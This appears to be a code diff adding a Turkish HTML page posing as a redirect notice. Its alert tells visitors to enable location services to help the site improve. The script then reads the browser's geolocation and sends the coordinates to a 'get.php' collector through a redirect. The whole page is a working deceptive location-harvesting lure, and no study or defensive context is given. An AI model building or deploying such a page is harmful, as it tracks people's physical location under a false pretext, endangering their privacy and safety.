@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="tr">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+    <title>Yönlendirme</title>
+  </head>
+  <body>
+   <script type="text/javascript">alert("Sayfaya yönlendirilmek üzeresiniz.Lütfen web sitemizin gelişmesi adına konum hizmetinizi açınız.");</script>
+
+
+   
+    <p id="KUL_DENE"></p>       
+
+    <div id="HAR_DENE"></div>
+
+        <script>
+            var x=document.getElementById("KUL_DENE");
+            function getuserLocation(){
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(showuserPosition,showbrowserError);
+                }
+                else{
+                    x.innerHTML="TARAYICI GEOLOCATION I DESTEKLEMIYOR";
+                }
+            }
+       
+        function showuserPosition(position) {
+            var latlon=position.coords.latitude+","+position.coords.longitude;
+            var img_url="http://maps.googleapis.com/maps/api/staticmap?center="
+            +latlon+"&zoom=14&size=400x300&sensor=false";
+            document.getElementById("HAR_DENE").innerHTML=latlon;
+            window.location = "get.php?veri="+latlon;
+            
+        }
+
+        function showbrowserError(error){
+            switch(error.code)
+            {
+                case error.PERMISSION_DENIED:
+                x.innerHTML="KULLANICI GEOLOCATION TALEBINI REDDETTI"
+                break;
+                case error.POSITION_UNAVAILABLE:
+                x.innerHTML="KONUM BILGISI YOK"
+                break;
+                case error.TIMEOUT:
+                x.innerHTML="ZAMAN ASIMI"
+                break;
+                case error.UNKNOWN_ERROR:
+                x.innerHTML="BILINMEYEN HATA"
+                break;
+            }
+        }
+        getuserLocation();
+        </script>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+  </body>
+</html>
